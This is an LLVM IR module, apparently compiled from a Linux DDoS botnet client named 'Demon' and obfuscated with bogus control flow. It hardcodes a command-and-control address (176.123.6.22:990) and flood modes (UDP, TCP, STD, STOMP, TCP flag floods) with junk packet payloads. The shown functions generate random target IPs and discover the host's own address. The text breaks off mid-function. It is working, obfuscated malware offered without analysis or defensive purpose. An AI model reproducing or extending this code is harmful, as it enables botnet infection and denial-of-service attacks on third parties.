; ModuleID = 'host/ir_bcf/Demon.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.ifreq = type { %union.anon, %union.anon.0 }
%union.anon = type { [16 x i8] }
%union.anon.0 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.2 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [17 x i8] c"176.123.6.22:990\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@pids = common global i32* null, align 8
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.11 = private unnamed_addr constant [159 x i8] c"4E/x31/x6B/x4B/x31/x20/x21/x73/x69/x20/x4D/x33/x75/x79/x20/x4C/x30/x56/x72/x33/x20/x3C/x33/x20/x50/x61/x32/x72/x43/x48/x20/x4D/x32/x20/x41/x34/x34/x72/x43/x4B\00", align 1
@.str.12 = private unnamed_addr constant [356 x i8] c"lXfYi\18fYC7TFaCq5Hv982wuIiKbHlgFA0jEsW2OFQStO7x6zN9dBgayyWgvbk0L3lZClzJCmFG3GVNDFc2iTHNYy7gss8dHboBdeKE1VcblH1AxrVyiqokw2RYFvd4cd1QxyaHawwP6go9feBeHdlvMRDLbEbty3Py8yVT3UTjy3ZKONXmMNvURTUZTkeH37XT9H5JwH0vKB1Yw2rSYkTwcTvx6OltSIlahFg92uCRbLM8amh8GaGGGRw56iNUTGLgi395vj9ZVVeP01k7Tvq3NRvxo########!!!!!!!!!!!!!!!@!@!@$!%@&$^!@%%^!@%*!(@%&*(!@%&!@*(%&!@()%*!@%))\00", align 1
@.str.13 = private unnamed_addr constant [193 x i8] c"/x6f/x58/x22/x2e/x04/x92/x04/xa4/x42/x94/xb4/xf4/x44/xf4/x94/xd2/x04/xb4/xc4/xd2/x05/x84/xb4/xa4/xa6/xb3/x24/xd4/xb4/xf4/xa5/x74/xf4/x42/x04/x94/xf2/x24/xf5/x02/x03/xc4/x45/x04/xf5/x14/x44/x23\00", align 1
@.str.14 = private unnamed_addr constant [60 x i8] c"xmiwdio MOQWI\22K (**(D8u9289d2892e9 NIOWJDiojwioWAJM DKLAM) \00", align 1
@.str.15 = private unnamed_addr constant [193 x i8] c"/x48/x39/x32/x29/x53/x54/x49/x6c/x65/x20/x29/x5f/x51/x20/x49/x53/x4e/x22/x20/x4b/x58/x4d/x3c/x20/x4f/x53/x51/x22/x4f/x50/x20/x50/x41/x43/x4b/x45/x54/x20/xc2/xa3/x52/x4f/x4d/x57/x44/x4b/x4c/x57\00", align 1
@.str.16 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.17 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"Python Device\00", align 1
@.str.19 = private unnamed_addr constant [14 x i8] c"/usr/bin/perl\00", align 1
@.str.20 = private unnamed_addr constant [12 x i8] c"Perl Device\00", align 1
@.str.21 = private unnamed_addr constant [18 x i8] c"/usr/sbin/telnetd\00", align 1
@.str.22 = private unnamed_addr constant [14 x i8] c"Telnet Device\00", align 1
@.str.23 = private unnamed_addr constant [8 x i8] c"Unknown\00", align 1
@.str.24 = private unnamed_addr constant [3 x i8] c"22\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"23\00", align 1
@.str.26 = private unnamed_addr constant [18 x i8] c"/etc/apt/apt.conf\00", align 1
@.str.27 = private unnamed_addr constant [20 x i8] c"Debian Based Device\00", align 1
@.str.28 = private unnamed_addr constant [14 x i8] c"/etc/yum.conf\00", align 1
@.str.29 = private unnamed_addr constant [18 x i8] c"REHL Based Device\00", align 1
@.str.30 = private unnamed_addr constant [11 x i8] c"Unknown OS\00", align 1
@.str.31 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.32 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.33 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.34 = private unnamed_addr constant [45 x i8] c"Sending TCP Packets To: %s:%d for %d seconds\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"STOMP\00", align 1
@.str.36 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.39 = private unnamed_addr constant [46 x i8] c"[Shelling]-->[%s]-->[%s]-->[%s]-->[%s]-->[%s]\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %47, %1
  %11 = load i32, i32* @x
  %12 = load i32, i32* @y
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* %3, align 4
  %20 = icmp slt i32 %19, 4096
  %21 = load i32, i32* @x
  %22 = load i32, i32* @y
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %20, label %29, label %50

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i32, i32* %3, align 4
  %31 = sub nsw i32 %30, 3
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %32
  %34 = load i32, i32* %33, align 4
  %35 = load i32, i32* %3, align 4
  %36 = sub nsw i32 %35, 2
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %34, %39
  %41 = xor i32 %40, -1640531527
  %42 = load i32, i32* %3, align 4
  %43 = xor i32 %41, %42
  %44 = load i32, i32* %3, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  store i32 %43, i32* %46, align 4
  br label %47

; <label>:47:                                     ; preds = %29
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %3, align 4
  br label %10

; <label>:50:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %51 = load i32, i32* %3, align 4
  %52 = icmp slt i32 %51, 4096
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* @x.1
  %36 = load i32, i32* @y.2
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* %4, align 4
  %44 = load i32, i32* %3, align 4
  %45 = sub i32 %43, %44
  %46 = load i32, i32* @rand_cmwc.i, align 4
  %47 = zext i32 %46 to i64
  %48 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %47
  store i32 %45, i32* %48, align 4
  %49 = load i32, i32* @x.1
  %50 = load i32, i32* @y.2
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %45

originalBBalteredBB:                              ; preds = %originalBB, %34
  %57 = load i32, i32* %4, align 4
  %58 = load i32, i32* %3, align 4
  %_ = sub i32 0, %57
  %gen = add i32 %_, %58
  %_1 = sub i32 0, %57
  %gen2 = add i32 %_1, %58
  %59 = sub i32 %57, %58
  %60 = load i32, i32* @rand_cmwc.i, align 4
  %61 = zext i32 %60 to i64
  %62 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %61
  store i32 %59, i32* %62, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #9
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.5
  %5 = load i32, i32* @y.6
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  store i32 1, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %17 = load i32, i32* @x.5
  %18 = load i32, i32* @y.6
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %75, %originalBBpart2
  %26 = load i32, i32* @x.5
  %27 = load i32, i32* @y.6
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i32, i32* %15, align 4
  %35 = icmp eq i32 %34, 1
  %36 = load i32, i32* @x.5
  %37 = load i32, i32* @y.6
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %35, label %44, label %73

; <label>:44:                                     ; preds = %originalBBpart24
  %45 = load i32, i32* %16, align 4
  %46 = load i32, i32* %13, align 4
  %47 = icmp slt i32 %45, %46
  br i1 %47, label %48, label %73

; <label>:48:                                     ; preds = %44
  %49 = load i32, i32* @x.5
  %50 = load i32, i32* @y.6
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %48
  %57 = load i8*, i8** %12, align 8
  %58 = load i32, i32* %16, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = getelementptr inbounds i8, i8* %60, i64 -1
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp ne i32 %63, 10
  %65 = load i32, i32* @x.5
  %66 = load i32, i32* @y.6
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %73

; <label>:73:                                     ; preds = %originalBBpart28, %44, %originalBBpart24
  %74 = phi i1 [ false, %44 ], [ false, %originalBBpart24 ], [ %64, %originalBBpart28 ]
  br i1 %74, label %75, label %85

; <label>:75:                                     ; preds = %73
  %76 = load i32, i32* %14, align 4
  %77 = load i8*, i8** %12, align 8
  %78 = load i32, i32* %16, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  %81 = call i64 @read(i32 %76, i8* %80, i64 1)
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %15, align 4
  %83 = load i32, i32* %16, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %16, align 4
  br label %25

; <label>:85:                                     ; preds = %73
  %86 = load i32, i32* %15, align 4
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %85
  br label %91

; <label>:89:                                     ; preds = %85
  %90 = load i8*, i8** %12, align 8
  br label %91

; <label>:91:                                     ; preds = %89, %88
  %92 = phi i8* [ null, %88 ], [ %90, %89 ]
  ret i8* %92

originalBBalteredBB:                              ; preds = %originalBB, %3
  %93 = alloca i8*, align 8
  %94 = alloca i32, align 4
  %95 = alloca i32, align 4
  %96 = alloca i32, align 4
  %97 = alloca i32, align 4
  store i8* %0, i8** %93, align 8
  store i32 %1, i32* %94, align 4
  store i32 %2, i32* %95, align 4
  store i32 1, i32* %96, align 4
  store i32 0, i32* %97, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %98 = load i32, i32* %15, align 4
  %99 = icmp eq i32 %98, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %48
  %100 = load i8*, i8** %12, align 8
  %101 = load i32, i32* %16, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %100, i64 %102
  %104 = getelementptr inbounds i8, i8* %103, i64 -1
  %105 = load i8, i8* %104, align 1
  %106 = zext i8 %105 to i32
  %107 = icmp ne i32 %106, 10
  br label %originalBB6
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = load i32, i32* @x.7
  %2 = load i32, i32* @y.8
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [4096 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.ifreq, align 8
  %20 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %20, i32* %10, align 4
  %21 = load i32, i32* %10, align 4
  %22 = icmp eq i32 %21, -1
  %23 = load i32, i32* @x.7
  %24 = load i32, i32* @y.8
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %48

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.7
  %33 = load i32, i32* @y.8
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  store i32 0, i32* %9, align 4
  %40 = load i32, i32* @x.7
  %41 = load i32, i32* @y.8
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %213

; <label>:48:                                     ; preds = %originalBBpart2
  %49 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 16, i32 4, i1 false)
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)) #6
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %53 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %52, i32 0, i32 0
  store i32 %51, i32* %53, align 4
  %54 = call zeroext i16 @htons(i16 zeroext 53) #9
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %54, i16* %55, align 2
  %56 = load i32, i32* %10, align 4
  %57 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %58 = call i32 @connect(i32 %56, %struct.sockaddr* %57, i32 16)
  store i32 %58, i32* %12, align 4
  %59 = load i32, i32* %12, align 4
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %61, label %78

; <label>:61:                                     ; preds = %48
  %62 = load i32, i32* @x.7
  %63 = load i32, i32* @y.8
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %61
  store i32 0, i32* %9, align 4
  %70 = load i32, i32* @x.7
  %71 = load i32, i32* @y.8
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %213

; <label>:78:                                     ; preds = %48
  store i32 16, i32* %14, align 4
  %79 = load i32, i32* %10, align 4
  %80 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %81 = call i32 @getsockname(i32 %79, %struct.sockaddr* %80, i32* %14) #6
  store i32 %81, i32* %12, align 4
  %82 = load i32, i32* %12, align 4
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %101

; <label>:84:                                     ; preds = %78
  %85 = load i32, i32* @x.7
  %86 = load i32, i32* @y.8
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %84
  store i32 0, i32* %9, align 4
  %93 = load i32, i32* @x.7
  %94 = load i32, i32* @y.8
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %213

; <label>:101:                                    ; preds = %78
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 4
  store i32 %104, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %105 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i32 0, i32 0), i32 0)
  store i32 %105, i32* %15, align 4
  br label %106

; <label>:106:                                    ; preds = %143, %101
  %107 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %108 = load i32, i32* %15, align 4
  %109 = call i8* @fdgets(i8* %107, i32 4096, i32 %108)
  %110 = icmp ne i8* %109, null
  br i1 %110, label %111, label %145

; <label>:111:                                    ; preds = %106
  %112 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %113 = call i8* @strstr(i8* %112, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0)) #10
  %114 = icmp ne i8* %113, null
  br i1 %114, label %115, label %143

; <label>:115:                                    ; preds = %111
  %116 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  store i8* %116, i8** %17, align 8
  br label %117

; <label>:117:                                    ; preds = %138, %115
  %118 = load i32, i32* @x.7
  %119 = load i32, i32* @y.8
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %117
  %126 = load i8*, i8** %17, align 8
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp ne i32 %128, 9
  %130 = load i32, i32* @x.7
  %131 = load i32, i32* @y.8
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %129, label %138, label %141

; <label>:138:                                    ; preds = %originalBBpart216
  %139 = load i8*, i8** %17, align 8
  %140 = getelementptr inbounds i8, i8* %139, i32 1
  store i8* %140, i8** %17, align 8
  br label %117

; <label>:141:                                    ; preds = %originalBBpart216
  %142 = load i8*, i8** %17, align 8
  store i8 0, i8* %142, align 1
  br label %145

; <label>:143:                                    ; preds = %111
  %144 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %144, i8 0, i64 4096, i32 16, i1 false)
  br label %106

; <label>:145:                                    ; preds = %141, %106
  %146 = load i32, i32* %15, align 4
  %147 = call i32 @close(i32 %146)
  %148 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %149 = load i8, i8* %148, align 16
  %150 = icmp ne i8 %149, 0
  br i1 %150, label %151, label %194

; <label>:151:                                    ; preds = %145
  %152 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 0
  %153 = bitcast %union.anon* %152 to [16 x i8]*
  %154 = getelementptr inbounds [16 x i8], [16 x i8]* %153, i32 0, i32 0
  %155 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %156 = call i8* @strcpy(i8* %154, i8* %155) #6
